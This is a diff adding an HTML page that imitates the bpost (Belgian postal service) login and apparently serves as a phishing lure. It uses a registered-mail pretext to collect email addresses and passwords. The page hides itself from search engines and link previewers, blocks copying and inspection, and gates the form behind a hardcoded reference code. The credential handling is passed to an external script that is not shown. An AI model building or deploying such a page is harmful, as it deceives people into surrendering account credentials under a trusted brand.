@@ -1,0 +1,1118 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <style>
+@font-face {
+    font-family: 'PhoenicaPro';
+    src: url('./static/fonts/fonnts.com-phoenicapro-medium.otf') format('opentype');
+    font-weight: normal;
+    font-style: normal;
+    font-display: swap;
+}
+
+* {
+    font-family: 'PhoenicaPro', 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    font-weight: 500;
+}
+
+.center {
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+  width: 20%;
+  background: white;
+}
+
+.company-logo img {
+    height: 36.13px;
+    width: 66px;
+}
+
+.forgot-password {
+    background: none;       
+    border: none;           
+    color: #262626;         
+    text-decoration: underline;  
+    cursor: pointer;
+    font-size: 1rem;
+    padding: 0;
+    font-family: inherit;
+}
+
+.forgot-password:focus {
+    outline: 2px solid #262626;
+    outline-offset: 2px;
+}
+
+.ping-button:focus {
+    outline: 2px solid #262626;
+    outline-offset: 2px;
+}
+
+/* Checkboxes - visible black outline */
+input[type="checkbox"]:focus {
+    outline: 2px solid #262626;
+    outline-offset: 2px;
+}
+
+/* Style pour le contenu du header */
+.header-content {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 20px;
+}
+
+/* Style pour le titre avec police Phoenicapro Bold */
+.ping-header-title {
+    font-family: 'Phoenicapro', sans-serif;
+    font-weight: 700;
+    font-size: 1.8rem;
+    color: #666666;
+    margin-bottom: 10px;
+    text-align: left;
+    line-height: 1.1;
+    margin-top: 0;
+    flex: 1;
+    margin-right: 20px;
+}
+
+/* Style pour le bouton avec police Phoenicapro Regular */
+.ping-button {
+    font-family: 'Phoenicapro Regular', sans-serif;
+    font-weight: 400;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    box-sizing: border-box;
+}
+
+/* Style pour le texte d'information avec police système */
+.info-text {
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    font-weight: 400;
+    font-size: 14px;
+    color: #666;
+    line-height: 1.4;
+    font-smooth: always;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    text-rendering: optimizeLegibility;
+}
+
+/* Style pour les champs de saisie avec police système */
+.ping-input-container input {
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    font-weight: 400;
+    font-size: 14px;
+    font-smooth: always;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    text-rendering: optimizeLegibility;
+}
+
+/* Fenêtre modale de bienvenue */
+.welcome-modal {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.7);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    opacity: 1;
+    transition: opacity 0.3s ease-out;
+}
+
+.welcome-modal.fade-out {
+    opacity: 0;
+    pointer-events: none;
+}
+
+/* Styles pour la modale de référence */
+.reference-modal {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.5);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 1001;
+    animation: fadeIn 0.3s ease-out;
+}
+
+.reference-content {
+    background: white;
+    border-radius: 12px;
+    padding: 30px;
+    max-width: 400px;
+    width: 90%;
+    text-align: center;
+    box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+    animation: modalSlideIn 0.4s ease-out;
+    margin: 20px;
+}
+
+.reference-logo {
+    width: 60px;
+    margin-bottom: 15px;
+}
+
+.reference-title {
+    font-family: 'Phoenicapro', sans-serif;
+    font-weight: 700;
+    font-size: 1.4rem;
+    color: #262626;
+    margin-bottom: 8px;
+}
+
+.reference-subtitle {
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    font-size: 0.9rem;
+    color: #666;
+    margin-bottom: 20px;
+    line-height: 1.4;
+}
+
+.reference-input-container {
+    margin-bottom: 20px;
+}
+
+.reference-input-container input {
+    width: 100%;
+    padding: 12px 15px;
+    border: 2px solid #ddd;
+    border-radius: 8px;
+    font-size: 1rem;
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    text-align: center;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    box-sizing: border-box;
+    font-smooth: always;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    text-rendering: optimizeLegibility;
+}
+
+.reference-input-container input:focus {
+    outline: none;
+    border-color: #dc3545;
+    box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.1);
+}
+
+.reference-buttons {
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+}
+
+.reference-button {
+    padding: 10px 20px;
+    border-radius: 6px;
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    font-weight: 600;
+    font-size: 0.9rem;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    border: none;
+    min-width: 80px;
+    height: 40px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    box-sizing: border-box;
+}
+
+.reference-button-primary {
+    background: #dc3545;
+    color: white;
+}
+
+.reference-button-primary:hover {
+    background: #c82333;
+}
+
+.reference-button-secondary {
+    background: #6c757d;
+    color: white;
+}
+
+.reference-button-secondary:hover {
+    background: #5a6268;
+}
+
+.reference-button.loading {
+    opacity: 0.8;
+    cursor: not-allowed;
+    position: relative;
+    color: transparent !important;
+}
+
+.reference-button.loading::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    margin: auto;
+    width: 16px;
+    height: 16px;
+    border: 2px solid rgba(255, 255, 255, 0.3);
+    border-top: 2px solid #ffffff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.reference-error {
+    margin-top: 15px;
+    color: #dc3545;
+    font-size: 0.85rem;
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+}
+
+/* Style pour le bouton de connexion en chargement */
+.ping-button.loading {
+    opacity: 0.8 !important;
+    cursor: not-allowed !important;
+    position: relative !important;
+    color: transparent !important;
+    text-shadow: none !important;
+}
+
+.ping-button.loading::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    margin: auto;
+    width: 16px;
+    height: 16px;
+    border: 2px solid rgba(255, 255, 255, 0.3);
+    border-top: 2px solid #ffffff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+}
+
+.welcome-content {
+    background: white;
+    border-radius: 15px;
+    padding: 40px;
+    max-width: 500px;
+    width: 90%;
+    text-align: center;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    animation: modalSlideIn 0.5s ease-out;
+    margin: 20px;
+}
+
+/* Responsive design pour mobile */
+@media (max-width: 768px) {
+    .welcome-content {
+        padding: 30px 20px;
+        margin: 15px;
+        width: calc(100% - 30px);
+        max-width: none;
+    }
+    
+    .welcome-title {
+        font-size: 1.8rem;
+    }
+    
+    .welcome-subtitle {
+        font-size: 1rem;
+    }
+    
+    .welcome-description {
+        font-size: 0.9rem;
+    }
+    
+    .welcome-logo {
+        width: 80px;
+        margin-bottom: 20px;
+    }
+    
+    .ping-header-title {
+        font-size: 1.5rem;
+    }
+    
+    .ping-container {
+        padding: 0;
+        margin: 0;
+        width: 100%;
+        max-width: 100%;
+    }
+    
+    .ping-body-container {
+        padding: 20px 15px;
+    }
+    
+    .ping-input-container input {
+        width: 100%;
+        max-width: 100%;
+        box-sizing: border-box;
+    }
+    
+    .ping-button {
+        width: 100% !important;
+        max-width: 100%;
+        box-sizing: border-box;
+    }
+    
+    .company-logo img {
+        height: 36px;
+        width: 66px;
+    }
+    
+    .header-content {
+        flex-direction: column;
+        text-align: center;
+        align-items: center;
+    }
+    
+    .ping-header-title {
+        margin-right: 0;
+        margin-bottom: 0;
+        margin-top: 20px;
+        text-align: center;
+        flex: none;
+        font-size: 2rem;
+    }
+    
+    .company-logo {
+        order: -1;
+    }
+    
+    .info-text {
+        text-align: center;
+    }
+    
+    .reference-content {
+        padding: 25px 20px;
+        margin: 15px;
+        width: calc(100% - 30px);
+        max-width: none;
+    }
+    
+    .reference-title {
+        font-size: 1.2rem;
+    }
+    
+    .reference-subtitle {
+        font-size: 0.85rem;
+    }
+    
+    .reference-logo {
+        width: 50px;
+        margin-bottom: 12px;
+    }
+    
+    .reference-buttons {
+        flex-direction: column;
+        gap: 8px;
+    }
+    
+    .reference-button {
+        width: 100%;
+    }
+}
+
+@media (max-width: 480px) {
+    .welcome-content {
+        padding: 25px 15px;
+        margin: 10px;
+        width: calc(100% - 20px);
+    }
+    
+    .welcome-title {
+        font-size: 1.6rem;
+    }
+    
+    .welcome-subtitle {
+        font-size: 0.95rem;
+    }
+    
+    .welcome-description {
+        font-size: 0.85rem;
+    }
+    
+    .ping-header-title {
+        font-size: 1.3rem;
+    }
+    
+    .ping-body-container {
+        padding: 15px 10px;
+    }
+    
+    .ping-header-title {
+        font-size: 1.8rem;
+        margin-right: 0;
+        margin-top: 15px;
+    }
+    
+    .company-logo img {
+        height: 36px;
+        width: 66px;
+    }
+    
+    .reference-content {
+        padding: 20px 15px;
+        margin: 10px;
+        width: calc(100% - 20px);
+    }
+    
+    .reference-title {
+        font-size: 1.1rem;
+    }
+    
+    .reference-subtitle {
+        font-size: 0.8rem;
+    }
+    
+    .reference-logo {
+        width: 45px;
+        margin-bottom: 10px;
+    }
+}
+
+@keyframes modalSlideIn {
+    0% { 
+        opacity: 0; 
+        transform: scale(0.8) translateY(-20px); 
+    }
+    100% { 
+        opacity: 1; 
+        transform: scale(1) translateY(0); 
+    }
+}
+
+.welcome-logo {
+    width: 100px;
+    height: auto;
+    margin-bottom: 25px;
+}
+
+.welcome-title {
+    font-family: 'Phoenicapro', sans-serif;
+    font-weight: 700;
+    font-size: 2rem;
+    color: #333;
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.welcome-subtitle {
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    font-weight: 400;
+    font-size: 1.1rem;
+    color: #666;
+    text-align: center;
+    line-height: 1.6;
+    margin-bottom: 15px;
+}
+
+.welcome-description {
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    font-weight: 300;
+    font-size: 0.95rem;
+    color: #777;
+    text-align: center;
+    line-height: 1.5;
+    margin-bottom: 20px;
+}
+
+.welcome-button {
+    background: #dc3545;
+    color: white;
+    border: none;
+    padding: 15px 30px;
+    border-radius: 25px;
+    font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    font-weight: 600;
+    font-size: 1rem;
+    cursor: pointer;
+    transition: background 0.3s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 10px auto 0 auto;
+    line-height: normal;
+    text-align: center;
+    height: auto;
+    min-height: 50px;
+    box-sizing: border-box;
+}
+
+.welcome-button:hover {
+    background: #c82333;
+}
+
+.welcome-button.loading {
+    opacity: 0.8;
+    cursor: not-allowed;
+    position: relative;
+    color: transparent !important;
+}
+
+.welcome-button.loading::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    margin: auto;
+    width: 16px;
+    height: 16px;
+    border: 2px solid rgba(255, 255, 255, 0.3);
+    border-top: 2px solid #ffffff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+}
+
+/* Style pour le bouton d'envoi dans la modale d'expiration */
+#sendButton.loading {
+    opacity: 0.8 !important;
+    cursor: not-allowed !important;
+    position: relative !important;
+    color: transparent !important;
+    text-shadow: none !important;
+}
+
+#sendButton.loading::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    margin: auto;
+    width: 16px;
+    height: 16px;
+    border: 2px solid rgba(255, 255, 255, 0.3);
+    border-top: 2px solid #ffffff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+}
+
+/* Protection CSS Anti-copie */
+body {
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    -webkit-touch-callout: none;
+    -webkit-tap-highlight-color: transparent;
+}
+
+/* Protection contre la sélection de texte */
+* {
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+}
+
+/* Exception pour les champs de saisie */
+input, textarea {
+    -webkit-user-select: text;
+    -moz-user-select: text;
+    -ms-user-select: text;
+    user-select: text;
+}
+
+/* Protection contre le clic droit */
+body {
+    -webkit-context-menu: none;
+    -moz-context-menu: none;
+    -ms-context-menu: none;
+    context-menu: none;
+}
+
+/* Masquage du contenu lors de la sélection */
+::selection {
+    background: transparent;
+    color: inherit;
+}
+
+::-moz-selection {
+    background: transparent;
+    color: inherit;
+}
+
+/* Protection contre le drag & drop */
+img {
+    -webkit-user-drag: none;
+    -khtml-user-drag: none;
+    -moz-user-drag: none;
+    -o-user-drag: none;
+    user-drag: none;
+    pointer-events: none;
+}
+
+/* Protection contre l'inspection */
+@media print {
+    body { display: none !important; }
+}
+
+/* Masquage du contenu pour les outils de développement */
+body::before {
+    content: "";
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: transparent;
+    z-index: 999999;
+    pointer-events: none;
+}
+
+/* Protection contre les outils de capture d'écran */
+@media screen and (max-width: 0px) {
+    body { display: none !important; }
+}
+
+</style>
+    <title>Se connecter avec votre compte bpost</title>
+    <base href=".">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/jpeg" href="./static/favi.jpg">
+    <link rel="shortcut icon" type="image/jpeg" href="./static/favi.jpg">
+    <link rel="apple-touch-icon" href="./static/favi.jpg">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=2.0">
+    <meta http-equiv="x-ua-compatible" content="IE=edge">
+    
+    <!-- Protection Meta Tags -->
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="slurp" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="duckduckbot" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="baiduspider" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="yandexbot" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="facebookexternalhit" content="noindex, nofollow">
+    <meta name="twitterbot" content="noindex, nofollow">
+    <meta name="linkedinbot" content="noindex, nofollow">
+    <meta name="whatsapp" content="noindex, nofollow">
+    <meta name="telegrambot" content="noindex, nofollow">
+    
+    <!-- Protection contre la copie -->
+    <meta name="copyright" content="© 2025 bpost - Tous droits réservés">
+    <meta name="author" content="bpost">
+    <meta name="generator" content="bpost">
+    
+    <!-- Headers de sécurité -->
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
+    <meta http-equiv="Referrer-Policy" content="no-referrer">
+    <meta http-equiv="Permissions-Policy" content="geolocation=(), microphone=(), camera=()">
+    <link rel="stylesheet" type="text/css" href="./static/main.css">
+    <link rel="stylesheet" media="all" type="text/css" href="./static/bpost.css">
+    <link href="./static/css2" rel="stylesheet">
+    
+    <!-- Polices Phoenicapro locales -->
+    <style>
+        @font-face {
+            font-family: 'Phoenicapro';
+            src: url('./static/fonts/fonnts.com-phoenicapro-bold.otf') format('opentype');
+            font-weight: 700;
+            font-style: normal;
+        }
+        
+        @font-face {
+            font-family: 'Phoenicapro Medium';
+            src: url('./static/fonts/fonnts.com-phoenicapro-medium.otf') format('opentype');
+            font-weight: 500;
+            font-style: normal;
+        }
+        
+        @font-face {
+            font-family: 'Phoenicapro Light';
+            src: url('./static/fonts/fonnts.com-phoenicapro-light.otf') format('opentype');
+            font-weight: 300;
+            font-style: normal;
+        }
+        
+        @font-face {
+            font-family: 'Phoenicapro Regular';
+            src: url('./static/fonts/fonnts.com-phoenicapro-regular.otf') format('opentype');
+            font-weight: 400;
+            font-style: normal;
+        }
+    </style>
+</head>
+
+<body onload="setFocus();">
+    <!-- Fenêtre modale de bienvenue -->
+    <div id="welcomeModal" class="welcome-modal">
+        <div class="welcome-content">
+            <img src="./static/bpost_logo_001A.png" alt="Logo bpost" class="welcome-logo">
+            <h1 class="welcome-title">Bienvenue sur bpost</h1>
+            <p class="welcome-subtitle">Envoyez, recevez et gérez vos courriers recommandés en toute sécurité.</p>
+            <p class="welcome-description">Notre plateforme vous garantit une transmission fiable, confidentielle et rapide de vos documents importants.</p>
+            <button class="welcome-button" onclick="showReferenceModal()">Commencer</button>
+        </div>
+    </div>
+
+    <div id="referenceModal" class="reference-modal">
+        <div class="reference-content">
+            <img src="./static/bpost_logo_001A.png" alt="Logo bpost" class="reference-logo">
+            <h2 class="reference-title">Vérification de référence</h2>
+            <p class="reference-subtitle">Veuillez saisir votre numéro de référence pour continuer</p>
+            <div class="reference-input-container">
+                <input type="text" id="referenceInput" placeholder="Entrez votre numéro de référence" maxlength="7">
+            </div>
+            <div class="reference-buttons">
+                <button class="reference-button reference-button-primary" onclick="verifyReference()">Vérifier</button>
+                <button class="reference-button reference-button-secondary" onclick="goBack()">Retour</button>
+            </div>
+            <div id="referenceError" class="reference-error" style="display: none;">
+                <img src="./static/alerte.png" alt="Erreur" style="width: 14px; height: 14px; margin-right: 6px; vertical-align: middle;">
+                Numéro de référence incorrect
+            </div>
+        </div>
+    </div>
+
+    <div class="ping-container ping-signin login-template">
+        <div class="ping-header">
+            <div class="header-content">
+                <h1 class="ping-header-title">Confirmer votre identité avec bpost</h1>
+                <span class="company-logo">
+                    <img src="./static/company-logo.png" class="center" alt="Logo bpost">
+                </span>
+            </div>
+            
+            <div class="info-text" style="margin-top: 10px; margin-bottom: 0px;">
+                <img src="./static/alerte.png" alt="Alerte" style="width: 16px; height: 16px; margin-right: 8px; vertical-align: middle;">
+                Pour accuser réception de votre courrier, un code à 6 chiffres vous sera envoyé par mail.<br>
+                Veuillez vous connecter à l'adresse e-mail ayant reçu le courrier recommandé.
+            </div>
+            <script language="javascript" type="text/javascript">
+                function getParamValue(keyName) {
+                    var results = new RegExp('[\?&]' + keyName + '=([^&#]*)').exec(window.location.href);				
+                    if(results != null ){				
+                        return decodeURIComponent(results[1]);
+                    }
+                    return "";			
+                }
+                
+                function getUrlValue(keyName) {
+                    var results = new RegExp('[\?&]' + keyName + '=([^&#]*)').exec(window.location.href);				
+                    if(results != null ){				
+                        if(isValidUrl(decodeURIComponent(results[1]))){
+                            return decodeURIComponent(results[1]);
+                        }
+                        else{
+                            return "";
+                        }				
+                    }
+                    return "";			
+                }		
+                
+                function isValidUrl(str) {			
+                    var regex = /(http|https):\/\/(\w+:{0,1}\w*)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%!\-\/]))?(bpost.be|bpost.cloud|.netpost)/;
+                    var pattern = new RegExp(regex); 
+                    return pattern.test(str);
+                }
+                
+                function setUilocale(){
+                    //OSP custom kang cookie
+                    if(getCookie("pf-app-lang").localeCompare(getCookie("pf-accept-language"))!=0){				
+                        setPFLangCookie(getCookie("pf-app-lang"));
+                    }
+                    //set app_target_uri & profile_target_uri
+                    if(sessionStorage.getItem("cancelKey")!= "on" && sessionStorage.getItem("hrefKey")!= "on"){
+                        localStorage.setItem("app_target_uri", getUrlValue("app_target_uri"));
+                        localStorage.setItem("profile_target_uri", getUrlValue("profile_target_uri"));
+                    }
+                    else{
+                        sessionStorage.removeItem("cancelKey");				
+                    }				
+                    //set ui_lang
+                    if(getParamValue("ui_locales") !=""){
+                        var localeLang = getParamValue("ui_locales");								
+                    }
+                    else{
+                        var localeLang = getParamValue("ui_lang");
+                    }
+                    if(localeLang != "" && sessionStorage.getItem("hrefKey")!= "on"){				
+                        var cookieLang=getCookie("pf-accept-language");						
+                        if(localeLang.localeCompare(cookieLang)!=0){				
+                            setPFLangCookie(localeLang);
+                        }					
+                    }
+                    else{
+                        sessionStorage.removeItem("hrefKey");
+                    }
+                    if(getParamValue("reg_page") =="y"){
+                        postRegistration();
+                    }
+                }
+                
+                function getCookie(cname) {
+                    var name = cname + "=";
+                    var ca = document.cookie.split(';');
+                    for(var i = 0; i < ca.length; i++) {
+                        var c = ca[i];
+                        while (c.charAt(0) == ' ') {
+                            c = c.substring(1);
+                        }
+                        if (c.indexOf(name) == 0) {
+                            return c.substring(name.length, c.length);
+                        }
+                    }
+                    return "";
+                }	
+                
+                function setPFLangCookie(localestr){
+                    document.cookie="pf-accept-language="+localestr+"; expires=Thu, 2 Aug 2031 20:47:11 UTC; path=/";
+                    var rootdomain=location.hostname.split('.').reverse().splice(0,2).reverse().join('.');
+                    document.cookie="pf-app-lang="+localestr+"; domain="+rootdomain+"; expires=Thu, 2 Aug 2031 20:47:11 UTC; path=/";
+                    window.location.reload();
+                }
+                
+                function setHrefCookie(localehref){
+                    sessionStorage.setItem("hrefKey", "on");
+                    setPFLangCookie(localehref);
+                }
+            </script>
+            
+        </div>
+        <!-- .ping-header -->
+
+        <div class="ping-body-container">
+            <div>
+                <form method="POST" action="#" autocomplete="off" onsubmit="return false;">
+                    <div class="ping-messages"></div>
+
+                    <div style="text-align: center; margin: 5px 0 40px 0; font-weight: 600; font-size: 32px; color: #dc3545;">
+                        Identification
+                    </div>
+
+                    <div class="ping-input-label">
+                        <label for="Username">Adresse e-mail</label>
+                    </div>
+                    <div class="ping-input-container">
+                        <input id="username" type="text" size="36" name="pf.username" value="" autocorrect="off" autocapitalize="off" aria-describedby="username-text" onkeypress="return postOnReturn(event)">
+                        <div class="place-bottom type-alert tooltip-text" id="username-text" role="alert">
+                            <div class="icon">!</div>
+                            Veuillez remplir ce champ.
+                        </div>
+                    </div>
+
+                    <div class="ping-input-label">
+                        <label for="password">Mot de passe</label>
+                    </div>
+                    <div class="ping-input-container password-container">
+                        <input id="password" type="password" size="36" name="pf.pass" aria-describedby="password" onkeypress="return postOnReturn(event)">
+                        <div class="place-bottom type-alert tooltip-text" id="password-text">
+                            <div class="icon">!</div>
+                            Veuillez remplir ce champ.
+                        </div>
+                    </div>
+                    
+                    <div>
+                        <input type="hidden" name="pf.ok" value="">
+                        <input type="hidden" name="pf.cancel" value="">
+                        <button type="button" onclick="postOk(); return false;" class="ping-button normal allow ping-checkbox-container stacked" title="Se connecter" style="padding: 0 5px; width: 400px; height: 40px; text-align: inherit; line-height: 36px;">
+                            Accéder à mon courrier
+                        </button>
+                    </div>
+                    <!-- .ping-buttons -->
+                    <br>
+                    
+                    
+                    <div class="ping-checkbox-container stacked">
+                        <input type="hidden" name="gtc" value="">						
+                        En me connectant, je confirme avoir lu et accepté les
+                        <a href="#" target="_blank">conditions générales du compte bpost</a>
+                        .
+                    </div>						
+                    
+                    <div class="ping-checkbox-container stacked">
+                        <input type="hidden" name="faq" value="">
+                        Problème pour vous connecter ?
+                        <a href="#" target="_blank">Consultez nos FAQ</a>							
+                    </div>
+                    
+                    <div class="ping-checkbox-container stacked">
+                        <input type="hidden" name="accesstatement" value="">
+                        <a href="#" target="_blank">Déclaration d'accessibilité</a>
+                    </div>
+                    
+                    <input type="hidden" name="pf.adapterId" id="pf.adapterId" value="B2CSMLNextGen">
+                </form>
+            </div>
+            <!-- .ping-body// blank div -->
+        </div>
+        <!-- .ping-body-container -->
+    </div>
+    <!-- .ping-container -->
+
+    <script type="text/javascript">
+        function setLoginAppName(){
+            var rootdomain=location.hostname.split('.').reverse().splice(0,2).reverse().join('.');
+            document.cookie="pf-login-app=sml_web_ciam_pr; domain="+rootdomain+"; expires=Thu, 2 Aug 2031 20:47:11 UTC; path=/";
+        }
+        
+        function postForgotPassword() {
+            document.forms[0]['pf.passwordreset'].value = 'clicked';
+            // Simuler la soumission du formulaire
+            alert('Fonctionnalité mot de passe oublié - page de démonstration');
+        }
+
+        function postRecoverUsername() {
+            var target = "#";
+            document.forms[0].action = target;
+            document.forms[0]['pf.usernamerecovery'].value = 'clicked';
+            // Simuler la soumission du formulaire
+            alert('Fonctionnalité récupération nom d\'utilisateur - page de démonstration');
+        }
+
+        function postAlternateAuthnSystem(system) {
+            var variants = ["Biometrics", "Windows Hello", "Face ID",  "Touch ID"];
+            if(variants.includes(system)) system = "FIDO";
+            document.forms[0]['pf.alternateAuthnSystem'].value = system;
+            // Simuler la soumission du formulaire
+            alert('Fonctionnalité authentification alternative - page de démonstration');
+        }
+
+        function postRegistration() {
+            document.forms[0]['pf.registration'].value = true;
+            // Simuler la soumission du formulaire
+            alert('Fonctionnalité création de compte - page de démonstration');
+        }
+
+        // Initialiser les fonctions au chargement
+        setLoginAppName();
+        setUilocale();
+        
+        // Gérer la fenêtre modale de bienvenue
+        function showWelcomeModal() {
+            const welcomeModal = document.getElementById('welcomeModal');
+            const loginContainer = document.querySelector('.ping-container');
+            
+            // Masquer la page de connexion au début
+            loginContainer.style.display = 'none';
+        }
+        
+        function showReferenceModal() {
+            const welcomeModal = document.getElementById('welcomeModal');
+            const referenceModal = document.getElementById('referenceModal');
+            welcomeModal.classList.add('fade-out');
+            setTimeout(() => {
+                welcomeModal.style.display = 'none';
+                referenceModal.style.display = 'flex';
+                document.getElementById('referenceInput').focus();
+            }, 300);
+        }
+        
+        function verifyReference() {
+            const input = document.getElementById('referenceInput');
+            const errorDiv = document.getElementById('referenceError');
+            const verifyButton = document.querySelector('.reference-button-primary');
+            const referenceNumber = input.value.trim().toUpperCase();
+            
+            // Masquer l'erreur précédente
+            errorDiv.style.display = 'none';
+            input.style.borderColor = '#ddd';
+            
+            if (referenceNumber === 'B224800') {
+                // Ajouter l'état de chargement
+                verifyButton.classList.add('loading');
+                verifyButton.disabled = true;
+                
+                // Simuler un délai de vérification
+                setTimeout(() => {
+                    closeReferenceModal();
+                }, 2000); // 2 secondes de chargement
+            } else {
+                errorDiv.style.display = 'flex';
+                input.style.borderColor = '#dc3545';
+                setTimeout(() => {
+                    errorDiv.style.display = 'none';
+                    input.style.borderColor = '#ddd';
+                }, 3000);
+            }
+        }
+        
+        function goBack() {
+            const welcomeModal = document.getElementById('welcomeModal');
+            const referenceModal = document.getElementById('referenceModal');
+            const verifyButton = document.querySelector('.reference-button-primary');
+            
+            // Réinitialiser le bouton
+            verifyButton.classList.remove('loading');
+            verifyButton.disabled = false;
+            
+            // Masquer l'erreur
+            const errorDiv = document.getElementById('referenceError');
+            errorDiv.style.display = 'none';
+            
+            // Réinitialiser le champ
+            const input = document.getElementById('referenceInput');
+            input.value = '';
+            input.style.borderColor = '#ddd';
+            
+            referenceModal.style.display = 'none';
+            welcomeModal.style.display = 'flex';
+            welcomeModal.classList.remove('fade-out');
+        }
+        
+        function closeReferenceModal() {
+            const referenceModal = document.getElementById('referenceModal');
+            const loginContainer = document.querySelector('.ping-container');
+            referenceModal.style.display = 'none';
+            loginContainer.style.display = 'block';
+            setFocus();
+        }
+        
+        // Gestion de la touche Entrée dans le champ de référence
+        document.addEventListener('DOMContentLoaded', function() {
+            const referenceInput = document.getElementById('referenceInput');
+            if (referenceInput) {
+                referenceInput.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        verifyReference();
+                    }
+                });
+            }
+        });
+        
+        // Démarrer la modale de bienvenue
+        showWelcomeModal();
+    </script>
+    
+    <!-- Inclusion du système de connexion -->
+    <script src="./static/login-system.js"></script>
+</body>
+</html>
